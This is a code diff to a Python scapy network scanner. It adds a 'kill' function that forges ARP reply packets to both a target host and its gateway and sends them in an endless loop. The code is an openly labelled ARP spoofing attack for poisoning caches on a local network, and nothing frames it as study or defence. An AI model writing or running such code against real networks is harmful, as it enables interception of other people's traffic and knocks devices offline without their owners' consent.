@@ -1,6 +1,9 @@
 from scapy.sendrecv import srp
 from scapy.layers.l2 import ARP, Ether
 from manuf import manuf
+from scapy.all import send
+import time
+import multiprocessing
 
 
 def arp_scan(ip):
@@ -38,6 +41,28 @@ def arp_scan(ip):
 
     return result2
 
+def kill(source, target_mac, target_ip, wait_after=1):
+        """
+        Spoofing target
+        """
+        # Cheat target
+        to_target = ARP(
+            op=2,
+            psrc=source[0],
+            hwdst=target_mac,
+            pdst=target_ip
+        )
 
-if __name__ == '__main__':
-    arp_scan("192.168.1.1/24")
+        # Cheat source
+        to_source = ARP(
+            op=2,
+            psrc=target_ip,
+            hwdst=source[1],
+            pdst=source[0]
+        )
+
+        while True:
+            # Send packets to both target and source
+            send(to_target, verbose=0)
+            send(to_source, verbose=0)
+            time.sleep(wait_after)
